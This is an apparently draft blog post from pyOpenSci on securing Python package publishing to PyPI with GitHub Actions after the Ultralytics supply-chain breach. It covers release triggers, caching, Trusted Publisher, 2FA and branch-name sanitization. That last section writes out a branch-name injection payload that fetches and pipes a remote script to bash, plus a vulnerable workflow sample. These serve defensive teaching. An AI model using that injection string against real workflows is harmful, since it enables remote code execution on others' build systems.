---
layout: single
title: "Staying Secure: Best Practices for Publishing Python Packages to PyPI"
excerpt: "blah"
author: "Leah Wasser"
permalink: /blog/python-packaging-security-publish-pypi.html
header:
  overlay_image: images/headers/pyopensci-inessa.png
  overlay_filter: rgba(20, 13, 36, 0.3)
categories:
  - blog-post
  - community
classes: wide
toc: true
comments: true
last_modified: 2024-12-13
---





## Is your PyPI publication workflow secure?

The recent Python package breach [involving Ultralytics](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection) has spotlighted the importance of securing your Python package PyPI publishing workflows. The Ultralytics breach was a supply chain attack where malicious actors exploited a GitHub workflow to inject harmful code into a Python package, enabling them to hijack users’ machines for Bitcoin mining. What this means in English:

> The Ultralytics breach happened when hackers tricked a Python package into running bad code, letting them use other people’s computers to mine Bitcoin without permission.

Yikes!

todo: just say no to bitcoin mining graphic


As open source maintainers, it’s unsettling to consider that our package users could become vulnerable to breaches like this.


However, there’s a silver lining. In this case, the incredible PyPI security team had already addressed most of the issues that led to the Ultralytics breach. This incident highlights a gap in understanding of Python packaging security best practices.


{% include pyos-blockquote.html quote="Because the Ultralytics project was using Trusted Publishing and the PyPA’s publishing GitHub Action: PyPI staff, volunteers, and security researchers were able to dig into how maliciously injected software was able to make its way into the package." author="Seth Larson, PSF Security Expert" class="highlight magenta" %}


This makes sense--we love open source but can't be experts in everything.

## Takeaways

The Ultralytics breach is a wake-up call for all maintainers: secure your workflows now to protect your users and the Python ecosystem. Start with these key actions:

### 🔐 Secure your workflows 🔐
- 🚫 Avoid risky events like `pull_request_target` and adopt release-based workflows.
- ♻️ Don’t cache dependencies in your publish workflows to prevent tampering.
- If you reference branches that others may use in a pull request, clean or sanitize branch names in your workflow.

### **Lock down GitHub repo access**
- 🔒 Restrict repository access to essential maintainers only.
- ✅ Add automated checks to ensure releases are authorized and secure.

### **Strengthen PyPI security**
- 🔑 Set up Trusted Publisher for tokenless authentication with PyPI.
- 📱 Enable 2FA for your PyPI account and store recovery codes securely.

Taking these steps will significantly reduce risks to your packages, contributors, and the broader Python ecosystem. Don’t wait—start securing your workflows today.

### **What Happened in the Ultralytics Breach?**

The Ultralytics incident was a **supply chain attack**—a type of attack where sneaky coders compromise the tools or processes used to create or distribute software. In this case, the bad actors/hackers wanted to use the user's machines to mine Bitcoin. This was a hack with the goal of using other people's compute for illegal profit!

In this case:

- An attacker exploited a GitHub action's trigger (`pull_request_target`) to inject malicious dependencies into the project.
- This code was then published to PyPI
- When a user downloaded and installed the package, their local machine was compromised.

**Yikes!**

TODO: image meme of someone's head exploding

The root cause of the breach was actually:

* A GitHub action workflow configuration that granted publish permissions to pull requests, allowing the attacker to execute unauthorized actions.
* A leak of the repositories' PyPI token (likely through GitHub secrets).
* A user (or bot?) gained direct access to the repo itself to push changes to the build that had previously provided some level of security around who could kick off a build that was published to PyPI.

If you want more details about what happened, [you should check out Seth Larson's PyPI blog post on the event](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/), Seth is the resident security expert for the PSF and Python.


## A call to action if you are publishing to PyPI using GitHub actions

What's important for us is that this event highlights the need for our ecosystem to follow and understand secure PyPI publishing practices and carefully monitor workflows. And the good news here is that if you are already publishing to PyPI using a GitHub action, there are things you can do RIGHT NOW to ensure your build is more secure.

For this post, we will use [this workflow that pyOpenSci has setup](https://github.com/pyOpenSci/pyosMeta/blob/main/.github/workflows/publish-pypi.yml) that was reviewed and developed by both a PyPI maintainer and also several core pyOpenSci community members that have significant knowledge about best practices in publishing to PyPI.

Below, are actionable steps you can take to enhance security when publishing Python packages to PyPI using GitHub actions.


## **1. Avoid `pull_request_target` and consider release-based workflows**

The [`pull_request_target`](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) event in GitHub Actions that Ultralytics used, allows workflows to run with elevated permissions on the base branch, even when triggered by changes from a fork. Thus, when used as a trigger to push a release to PyPI, your workflow becomes vulnerable.

Instead, consider adopting a **release-based workflow**:

- Trigger publication workflows only on versioned releases.
- Ensure workflows related to publishing are explicitly scoped to `release` events or tagged commits.

Notice in our workflow below that we use a `release` trigger to avoid these risks. While we also have a `push` trigger, it never triggers a publication to PyPI.


```yaml
name: Publish to PyPI
on:
  # By using release - only people with admin access to make releases to our repo can trigger the push to PyPI
  release:
    types: [published]
  push:
    branches:
      - main
```

In the example above, the push trigger is only used to test that the package distribution files can be built. To ensure that a package is only ever published on a release, we include a conditional in the publish-to-PyPI step:

```yaml
  - name: Publish package to PyPI
    # Only publish to real PyPI on release
    if: github.event_name == 'release'
```

This approach ensures that the publishing step is tightly controlled, reducing the risk of malicious activity in your workflow.

## 2. Don’t cache package dependencies in your publish step

Caching dependencies involves storing them to be reused in future workflow runs. This approach saves time, as GitHub doesn’t need to redownload all dependencies each time the workflow runs.

TODO: create graphic about reusing dependencies

However, caching dependencies can allow attackers to manipulate cached artifacts, such as dependencies. If this happens, the workflow may pull in compromised versions from the cache during the next run.

**Takeaway:**  Don’t cache dependencies in your Python package publishing workflow. Always download fresh dependencies to ensure you’re using the latest secure versions of any packages your project depends on.

Below is an example of a build that caches dependencies.

```yaml
name: Build and Test

on:
  push:
    branches:
      - main
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      # Step 1: Check out the repository
      - name: Check out repository
        uses: actions/checkout@v3

      # Step 2: Set up Python
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'

      # Step 3: Cache dependencies
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-

      # Step 4: Install dependencies
      - name: Install dependencies
        run: pip install -r requirements.txt

      # Step 5: Publish to PyPI
      ...
```


## 4. Use Trusted Publisher for PyPI

If you only [publish locally to PyPI using the command line](https://www.pyopensci.org/python-package-guide/tutorials/publish-pypi.html), you need to use a PyPI token. However, if you’re using GitHub Actions to automate your publishing process, setting up **Trusted Publisher** is a more secure option.

A Trusted Publisher setup creates a secure "pipeline" between PyPI and your GitHub repository because:
- PyPI is allowed to authenticate your builds directly, so no additional configuration is required.
- It restricts publishing to specific workflows and environments defined in your repository.

This setup eliminates the need to store sensitive tokens as GitHub secrets, significantly reducing the risk of token theft or unauthorized publication.

### How to get started

[PyPI provides a great guide to getting started with Trusted Publisher](https://docs.pypi.org/trusted-publishers/adding-a-publisher/).

The basic steps associated with Trusted Publisher are:
1. Go to your PyPI account and add a trusted publisher workflow to your account.
2. Fill out a form that looks like the one below. Notice that it asks for your workflow name, (optional) environment, and package name.
3. Update your GitHub action workflow to reference the Trusted Publisher configuration.

<figure>
  <picture>
    <source srcset="/images/python-packaging/trusted-publisher-form.webp" type="image/webp">
    <img src="trusted-publisher-form.webp" alt="PyPI Trusted Publisher form example showing settings for linking a GitHub repository with PyPI for secure publishing." loading="lazy">
  </picture>
  <figcaption>
    Example of the PyPI Trusted Publisher form, used to securely link a GitHub repository with PyPI for publishing Python packages. Trusted Publisher reduces the risk of token theft and improves overall security.
  </figcaption>
</figure>

You can see how to set up GitHub Actions securely in our own [PyPI publishing GitHub workflow](https://github.com/pyOpenSci/pyosMeta/blob/main/.github/workflows/publish-pypi.yml), which follows the Trusted Publisher approach.

**Note:** Trusted Publisher workflows are currently only available for GitHub. Support for GitLab may be coming in the future—stay tuned!
{: .notice }

## **5. Create a Dedicated Environment for Publish Actions**

Use isolated environments in combination with Trusted Publisher in your GitHub workflow to publish to PyPI.
Isolated environments ensure that your publishing process remains secure even if other parts of your CI pipeline are compromised.

If you look at the pyometra workflow, notice that we have an [environment called `pypi`](https://github.com/pyOpenSci/pyosMeta/blob/main/.github/workflows/publish-pypi.yml#L57) that is used for trusted publishing. By setting this up, we have created a direct pipeline between this action and PyPI via the pypi environment and the trusted publisher setup which refers to the workflow file's name.

```yaml
  publish:
    name: >-
      Publish Python 🐍 distribution 📦 to PyPI
    if: github.repository_owner == 'pyopensci'
    needs:
      - build
    runs-on: ubuntu-latest
    environment:
      name: pypi
      url: https://pypi.org/p/pyosmeta
```

## Sanitize a branch name in your workflow, before calling it!

One of the critical issues in the Ultralytics breach was that attackers crafted a [**malicious branch name containing a shell script**](https://github.com/ultralytics/ultralytics/pull/18020) 🤯. This script executed within the GitHub Action workflow because the branch name was directly referenced using `github.ref`.

When `github.ref` is used without sanitization, malicious content embedded in branch names can be executed. This is known as a **template injection**:

{% include pyos-blockquote.html quote="...is a classic GitHub Actions template injection: the expansion of `github.head_ref || github.ref` is injected directly into the shell’s context, with no quoting or interpolation.." author="https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection" class="highlight magenta" %}

Because the branch name wasn’t sanitized, it was treated as a shell command and executed with full permissions. Yikes!


### Problem: a GitHub action that calls 'ref' to the workflow that could be manipulated

Below is an example of a potentially vulnerable packaging workflow. If the branch name contains malicious content, this workflow could execute harmful commands:

```yaml
jobs:
  example-job:
    runs-on: ubuntu-latest
    steps:
      - name: Run a script
        run: |
          echo "Running script for branch: $GITHUB_REF"
```

### Solution: Sanitize the Branch Name

To fix this, sanitize or clean the branch name before using it in your workflows. A small Bash cleanup step removes unexpected or unsafe characters.

```
jobs:
  example-job:
    runs-on: ubuntu-latest
    steps:
      - name: Sanitize branch name
        run: |
          SAFE_BRANCH=$(echo $GITHUB_REF | sed 's/[^a-zA-Z0-9_\-\/]//g')
          echo "Sanitized branch name: $SAFE_BRANCH"
          echo "Running script for branch: $SAFE_BRANCH"
```

<div class="notice" markdown="1">
How cleaning the branch name works:

1.	echo $GITHUB_REF: Outputs the branch name.
2.	sed 's/[^a-zA-Z0-9_\-\/]//g': Removes any characters that are not letters, numbers, dashes, underscores, or slashes, ensuring the branch name is safe.

Try It:

Test how sanitization works by running this command in your shell:
the branch name:  $({curl,-sSfL,raw.githubusercontent.com/test/test/123456d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/dummyfile.sh} | bash)


```bash
# Input string
input='$({curl,-sSfL,raw.githubusercontent.com/test/test/123456d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/dummyfile.sh} | bash)'

# Sanitization step
sanitized=$(echo "$input" | sed 's/[\$\{\}\|\(\)]//g')

# Output the sanitized string
echo "Original: $input"
echo "Sanitized: $sanitized"
```

This strips out any characters that can be used to call shell commands.

</div>

The good news here is that if you use a release-based workflow as discussed earlier, then you don't have to worry about branch names. And yes you can always make a release from a different branch!

Restricting publish workflows to tagged releases significantly reduces the risk of such attacks.

### Delete Old Tokens

If you are using a trusted publisher workflow but have previously created PyPI API tokens for your package to use in GitHub Actions, it’s time to clean house:

- Identify and revoke/delete any unused or old tokens in your PyPI account!!
- Do the same for your GitHub secrets!
- Migrate to Trusted Publisher workflows to avoid using tokens entirely (if you can).

## GitHub & PyPI security tips

The above tips are focused on your GitHub workflows. However, you can also consider locking down your accounts too!

* Make sure you have 2FA (2-factor authentication) setup for both PyPI and GitHub. This is common these days for financial and even social media accounts. Set things up for your tech and open source accounts too!

Important: Store recovery codes securely (e.g., a password manager).

* Be careful about who can gain direct write access to your project's repository. Only a specific, trusted subset of maintainers should be able to trigger a publish-to-PyPI workflow. Most contributors and maintainers don’t need direct write access to your repository; limiting access reduces security risks.


## **Learn More**

pyOpenSci follows best practices for PyPI publishing using our custom GitHub Actions workflow. Check out our tutorial on Python packaging here:
👉 [pyOpenSci Packaging Tutorial](https://www.pyopensci.org/python-package-guide/package-structure-code/python-package-structure.html)
👉 Join our discourse here
